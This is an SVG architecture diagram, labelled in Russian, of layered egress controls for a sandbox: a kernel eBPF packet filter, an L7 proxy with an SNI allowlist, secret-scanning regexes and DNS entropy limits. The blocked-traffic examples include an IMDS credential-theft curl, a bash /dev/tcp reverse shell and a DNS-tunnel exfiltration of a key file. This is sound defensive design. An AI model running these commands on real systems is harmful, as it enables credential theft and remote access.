<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 450" width="100%" height="100%"
     font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif">
  <defs>
    <!-- Arrowhead markers -->
    <marker id="arr-navy" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#1e293b"/>
    </marker>
    <marker id="arr-teal" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#0f766e"/>
    </marker>
    <marker id="arr-burgundy" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#991b1b"/>
    </marker>
    <marker id="arr-ochre" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#92400e"/>
    </marker>
    <marker id="arr-slate" markerWidth="7" markerHeight="5" refX="6" refY="2.5" orient="auto">
      <path d="M0,0 L7,2.5 L0,5 Z" fill="#475569"/>
    </marker>
  </defs>

  <!-- Clean Canvas -->
  <rect width="960" height="450" fill="#ffffff"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 1: SANDBOXED NETWORK NAMESPACE (x=24 to 214, w=190)               -->
  <!-- ========================================================================= -->
  <g transform="translate(24, 20)">
    <rect width="190" height="410" rx="4" fill="#f8fafc" stroke="#991b1b" stroke-width="1.5"/>
    <rect width="190" height="28" rx="4" fill="#fee2e2" stroke="#991b1b" stroke-width="1.5"/>
    <text x="12" y="19" font-size="8.5" font-weight="700" fill="#991b1b">СЕТЕВОЕ ПРОСТРАНСТВО ИМЕН ПЕСОЧНИЦЫ</text>
    <text x="178" y="19" font-family="monospace" font-size="7.5" fill="#991b1b" text-anchor="end">veth0 / tap0</text>

    <!-- Sub-block 1: Configuration -->
    <g transform="translate(10, 36)">
      <rect width="170" height="66" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Конфигурация интерфейса</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Изолированное сетевое пространство имен</text>
      <text x="8" y="40" font-size="7.5" fill="#475569">Нет шлюза хоста по умолчанию</text>
      <text x="8" y="52" font-family="monospace" font-size="7" fill="#991b1b">Маршрут 0.0.0.0/0: не задан</text>
      <text x="8" y="62" font-size="6.8" fill="#0f766e">Нулевой неявный сетевой доступ</text>
    </g>

    <!-- Sub-block 2: Outbound Candidate Traffic -->
    <g transform="translate(10, 110)">
      <rect width="170" height="286" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="170" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Потоки исходящего трафика</text>

      <!-- Flow 1: Legitimate HTTPS -->
      <g transform="translate(8, 28)">
        <rect width="154" height="52" rx="2" fill="#f0fdf4" stroke="#86efac" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#166534">Установка пакетов (HTTPS)</text>
        <text x="6" y="24" font-family="monospace" font-size="7" fill="#15803d">pip install requests</text>
        <text x="6" y="36" font-family="monospace" font-size="7" fill="#475569">dst: pypi.org:443</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#166534">Законная загрузка инструмента</text>
      </g>

      <!-- Flow 2: IMDS SSRF -->
      <g transform="translate(8, 86)">
        <rect width="154" height="58" rx="2" fill="#fef2f2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">SSRF к облачным IMDS</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#991b1b">curl 169.254.169.254</text>
        <text x="6" y="35" font-family="monospace" font-size="6.8" fill="#991b1b">  /latest/meta-data/iam</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#b91c1c">Угроза кражи учетных данных хоста</text>
      </g>

      <!-- Flow 3: Raw Reverse Shell -->
      <g transform="translate(8, 150)">
        <rect width="154" height="58" rx="2" fill="#fef2f2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Обратная оболочка на сыром IP</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#991b1b">bash -i &gt;&amp; /dev/tcp/</text>
        <text x="6" y="35" font-family="monospace" font-size="6.8" fill="#991b1b">  198.51.100.1/4444</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#b91c1c">Прямое TCP-соединение с C2</text>
      </g>

      <!-- Flow 4: DNS Covert Tunnel -->
      <g transform="translate(8, 214)">
        <rect width="154" height="60" rx="2" fill="#fef2f2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Скрытый DNS-туннель</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#991b1b">token=$(cat /etc/key)</text>
        <text x="6" y="35" font-family="monospace" font-size="6.8" fill="#991b1b">dig $token.evil.org</text>
        <text x="6" y="46" font-size="6.5" font-weight="600" fill="#b91c1c">Эксфильтрация секретов через UDP</text>
      </g>
    </g>
  </g>

  <!-- Flow Connector: Sandbox to eBPF -->
  <line x1="214" y1="225" x2="232" y2="225" stroke="#1e293b" stroke-width="2" marker-end="url(#arr-navy)"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 2: LAYER 1 — KERNEL EBPF PACKET FILTER (x=234 to 464, w=230)       -->
  <!-- ========================================================================= -->
  <g transform="translate(234, 20)">
    <rect width="230" height="410" rx="4" fill="#f8fafc" stroke="#1e293b" stroke-width="1.5"/>
    <rect width="230" height="28" rx="4" fill="#f1f5f9" stroke="#1e293b" stroke-width="1.5"/>
    <text x="115" y="19" font-size="8.5" font-weight="700" fill="#1e293b" text-anchor="middle">СЛОЙ 1: ФИЛЬТР ПАКЕТОВ ЯДРА</text>

    <!-- Sub-block 1: Architectural Mechanics -->
    <g transform="translate(10, 36)">
      <rect width="210" height="66" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Механика фильтра пакетов (хук tc)</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Вычисляется до <tspan font-family="monospace">sk_buff</tspan> выделения</text>
      <text x="8" y="40" font-size="7.5" fill="#475569">Без переключения контекста; сброс внутри ядра</text>
      <text x="8" y="52" font-family="monospace" font-size="7" fill="#0f766e">D(p) = FORWARD, если dst==IP_proxy</text>
      <text x="8" y="62" font-family="monospace" font-size="7" fill="#991b1b">     иначе DROP (TC_ACT_SHOT)</text>
    </g>

    <!-- Sub-block 2: Ordered Disposition Rules Table -->
    <g transform="translate(10, 110)">
      <rect width="210" height="286" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="210" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Упорядоченные правила фильтра</text>

      <!-- Rule 1: IMDS Trap -->
      <g transform="translate(8, 26)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Правило 1: ловушка IMDS с локальным адресом</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">dst == 169.254.0.0/16 or [fd00:ec2::254]</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Вердикт: TC_ACT_SHOT (DROP + тревога)</text>
      </g>

      <!-- Rule 2: Intranet Trap -->
      <g transform="translate(8, 76)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Правило 2: ловушка внутренней сети RFC 1918</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">dst in {10.0/8, 172.16/12, 192.168/16}</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Вердикт: TC_ACT_SHOT (блокирует боковое перемещение)</text>
      </g>

      <!-- Rule 3: Raw IP Trap -->
      <g transform="translate(8, 126)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Правило 3: ловушка сырого числового IP</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">Прямой числовой IP без аренды DNS</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Вердикт: TC_ACT_SHOT (прерывание обратной оболочки)</text>
      </g>

      <!-- Rule 4: Proxy Redirect -->
      <g transform="translate(8, 176)">
        <rect width="194" height="46" rx="2" fill="#f0fdf4" stroke="#86efac" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#166534">Правило 4: совпадение пересылки на прокси</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#14532d">dst == IP_proxy &amp;&amp; dport == P_proxy</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#166534">Вердикт: TC_ACT_OK (ПЕРЕСЛАТЬ на прокси)</text>
      </g>

      <!-- Rule 5: Default Deny -->
      <g transform="translate(8, 226)">
        <rect width="194" height="46" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#991b1b">Правило 5: общий запрет по умолчанию</text>
        <text x="6" y="24" font-family="monospace" font-size="6.8" fill="#7f1d1d">Любой несопоставленный исходящий кадр</text>
        <text x="6" y="36" font-family="monospace" font-size="7" font-weight="700" fill="#991b1b">Вердикт: TC_ACT_SHOT (нулевые неявные полномочия)</text>
      </g>
    </g>
  </g>

  <!-- Flow Connector: eBPF to Envoy -->
  <line x1="464" y1="225" x2="482" y2="225" stroke="#0f766e" stroke-width="2" marker-end="url(#arr-teal)"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 3: LAYER 2 — TRANSPARENT APPLICATION PROXY (x=484 to 714, w=230)   -->
  <!-- ========================================================================= -->
  <g transform="translate(484, 20)">
    <rect width="230" height="410" rx="4" fill="#f8fafc" stroke="#0f766e" stroke-width="1.5"/>
    <rect width="230" height="28" rx="4" fill="#ccfbf1" stroke="#0f766e" stroke-width="1.5"/>
    <text x="115" y="19" font-size="8.5" font-weight="700" fill="#0f766e" text-anchor="middle">СЛОЙ 2: ПРОКСИ ИСХОДЯЩЕГО ТРАФИКА</text>

    <!-- Sub-block 1: Proxy Infrastructure -->
    <g transform="translate(10, 36)">
      <rect width="210" height="66" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Анклав посредничества прокси</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Завершается на петлевом интерфейсе / внутреннем vlan</text>
      <text x="8" y="40" font-size="7.5" fill="#475569">Глубокая инспекция L7 и терминирование TLS</text>
      <text x="8" y="52" font-family="monospace" font-size="7" fill="#0f766e">Прослушивание: IP_proxy:8443 (взаимный TLS)</text>
      <text x="8" y="62" font-size="6.8" fill="#334155">Криптографическая проверка идентичности клиента</text>
    </g>

    <!-- Sub-block 2: Inspection Engines -->
    <g transform="translate(10, 110)">
      <rect width="210" height="286" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="210" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#1e293b">Движки инспекции протоколов L7</text>

      <!-- Engine A: SNI Allowlist -->
      <g transform="translate(8, 26)">
        <rect width="194" height="74" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#1e293b">A. Список разрешенных хостов TLS SNI</text>
        <text x="6" y="24" font-size="7" fill="#475569">Извлекает SNI до рукопожатия TLS:</text>
        <rect x="6" y="28" width="182" height="18" rx="1" fill="#f0fdf4" stroke="#86efac" stroke-width="0.6"/>
        <text x="8" y="40" font-family="monospace" font-size="6.8" fill="#166534">СОВПАДЕНИЕ: *.pypi.org, *.github.com → ALLOW</text>
        <rect x="6" y="50" width="182" height="18" rx="1" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.6"/>
        <text x="8" y="62" font-family="monospace" font-size="6.8" fill="#991b1b">НЕСОВПАДЕНИЕ: evil-c2.com → 403 FORBIDDEN</text>
      </g>

      <!-- Engine B: Secret Scanner -->
      <g transform="translate(8, 106)">
        <rect width="194" height="78" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#1e293b">B. Маскирование секретов в исходящем трафике</text>
        <text x="6" y="24" font-size="7" fill="#475569">Глубокий сканер полезной нагрузки по регулярным выражениям для тел POST:</text>
        <rect x="6" y="28" width="182" height="42" rx="1" fill="#fef3c7" stroke="#fde68a" stroke-width="0.6"/>
        <text x="8" y="40" font-family="monospace" font-size="6.8" fill="#92400e">AWS: AKIA[0-9A-Z]{16}</text>
        <text x="8" y="50" font-family="monospace" font-size="6.8" fill="#92400e">GH:  ghp_[0-9a-zA-Z]{36}</text>
        <text x="8" y="62" font-size="6.5" font-weight="700" fill="#b45309">Действие: блокировать POST и разорвать сеанс</text>
      </g>

      <!-- Engine C: DNS Resolver -->
      <g transform="translate(8, 190)">
        <rect width="194" height="84" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
        <text x="6" y="12" font-size="7.5" font-weight="700" fill="#1e293b">C. Анклав DNS с раздельным горизонтом</text>
        <text x="6" y="24" font-size="7" fill="#475569">Строгое ограничение длины метки: ≤ 24 символов</text>
        <text x="6" y="36" font-size="7" fill="#475569">Фильтр энтропии Шеннона: H(X) &gt; 4.2 — сброс</text>
        <rect x="6" y="42" width="182" height="34" rx="1" fill="#f0fdfa" stroke="#99f6e4" stroke-width="0.6"/>
        <text x="8" y="54" font-family="monospace" font-size="6.8" fill="#0f766e">dig $token.evil.org → NXDOMAIN</text>
        <text x="8" y="68" font-size="6.5" font-weight="600" fill="#0f766e">Ограничение скорости: лимит эксфильтрации 30 байт/с</text>
      </g>
    </g>
  </g>

  <!-- Flow Connector: Envoy to Verdict -->
  <line x1="714" y1="225" x2="732" y2="225" stroke="#1e293b" stroke-width="2" marker-end="url(#arr-navy)"/>

  <!-- ========================================================================= -->
  <!-- COLUMN 4: EGRESS VERDICT & NETWORK BOUNDARY (x=734 to 936, w=202)         -->
  <!-- ========================================================================= -->
  <g transform="translate(734, 20)">
    <rect width="202" height="410" rx="4" fill="#f8fafc" stroke="#1e293b" stroke-width="1.5"/>
    <rect width="202" height="28" rx="4" fill="#f1f5f9" stroke="#1e293b" stroke-width="1.5"/>
    <text x="12" y="19" font-size="8.5" font-weight="700" fill="#1e293b">ВЕРДИКТ ИСХОДЯЩЕГО ТРАФИКА И СЕТЬ</text>

    <!-- Verdict 1: Approved -->
    <g transform="translate(10, 36)">
      <rect width="182" height="170" rx="3" fill="#ffffff" stroke="#16a34a" stroke-width="1.2"/>
      <rect width="182" height="22" rx="3" fill="#dcfce7" stroke="#16a34a" stroke-width="1.2"/>
      <text x="8" y="15" font-size="8" font-weight="700" fill="#15803d">РАЗРЕШЕННЫЙ ИСХОДЯЩИЙ ТРАФИК</text>

      <g transform="translate(8, 28)">
        <text x="0" y="12" font-family="monospace" font-size="7.5" font-weight="700" fill="#15803d">pypi.org / files.python...</text>
        <text x="0" y="22" font-size="6.8" fill="#475569">Зависимости Python wheel</text>

        <text x="0" y="38" font-family="monospace" font-size="7.5" font-weight="700" fill="#15803d">api.github.com</text>
        <text x="0" y="48" font-size="6.8" fill="#475569">Разрешенный удаленный git push</text>

        <text x="0" y="64" font-family="monospace" font-size="7.5" font-weight="700" fill="#15803d">registry.npmjs.org</text>
        <text x="0" y="74" font-size="6.8" fill="#475569">Разрешение модулей Node</text>

        <rect y="86" width="166" height="46" rx="2" fill="#f0fdf4" stroke="#86efac" stroke-width="0.8"/>
        <text x="83" y="100" font-size="7.5" font-weight="700" fill="#166534" text-anchor="middle">HTTP 200 OK</text>
        <text x="83" y="112" font-size="6.8" fill="#15803d" text-anchor="middle">Переслано через eth0 хоста</text>
        <text x="83" y="124" font-size="6.8" fill="#15803d" text-anchor="middle">Чистый конвейер выполнения</text>
      </g>
    </g>

    <!-- Verdict 2: Blocked / Trapped -->
    <g transform="translate(10, 214)">
      <rect width="182" height="182" rx="3" fill="#ffffff" stroke="#991b1b" stroke-width="1.2"/>
      <rect width="182" height="22" rx="3" fill="#fee2e2" stroke="#991b1b" stroke-width="1.2"/>
      <text x="8" y="15" font-size="8" font-weight="700" fill="#991b1b">ЗАБЛОКИРОВАНО / ПЕРЕХВАЧЕНО</text>

      <g transform="translate(8, 28)">
        <text x="0" y="12" font-family="monospace" font-size="7.2" font-weight="700" fill="#991b1b">169.254.169.254 (IMDS)</text>
        <text x="0" y="22" font-size="6.8" fill="#7f1d1d">Сброс фильтром ядра → TC_ACT_SHOT</text>

        <text x="0" y="38" font-family="monospace" font-size="7.2" font-weight="700" fill="#991b1b">198.51.100.1:4444 (сырой TCP)</text>
        <text x="0" y="48" font-size="6.8" fill="#7f1d1d">Обратная оболочка прервана на L4</text>

        <text x="0" y="64" font-family="monospace" font-size="7.2" font-weight="700" fill="#991b1b">evil-c2.com (SNI не в списке)</text>
        <text x="0" y="74" font-size="6.8" fill="#7f1d1d">HTTP 403 Forbidden → TCP RST</text>

        <rect y="86" width="166" height="60" rx="2" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="83" y="100" font-size="7.5" font-weight="700" fill="#991b1b" text-anchor="middle">СДЕРЖИВАНИЕ СРАБОТАЛО</text>
        <text x="83" y="112" font-size="6.8" fill="#7f1d1d" text-anchor="middle">Тревога записана в журнал траектории</text>
        <text x="83" y="124" font-size="6.8" fill="#7f1d1d" text-anchor="middle">Аренда песочницы отозвана</text>
        <text x="83" y="136" font-size="6.8" fill="#7f1d1d" text-anchor="middle">Нулевая эксфильтрация в сеть</text>
      </g>
    </g>
  </g>
</svg>